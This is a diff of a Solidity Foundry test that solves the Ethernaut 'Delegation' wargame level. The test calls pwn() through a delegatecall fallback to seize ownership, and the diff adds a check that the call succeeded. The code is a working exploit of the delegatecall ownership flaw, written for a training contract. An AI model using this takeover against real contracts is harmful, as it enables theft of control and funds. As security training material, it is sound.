@@ -36,7 +36,8 @@ contract DelegationTest is Test {
          * address(ethernautDelegation).call(abi.encode(bytes4(keccak256("pwn()"))));
          *2. straightforwad way
          */
-        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
+        (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
+        require(success);
         assertEq(ethernautDelegation.owner(), player);
         /*****************
          *Level Submission*
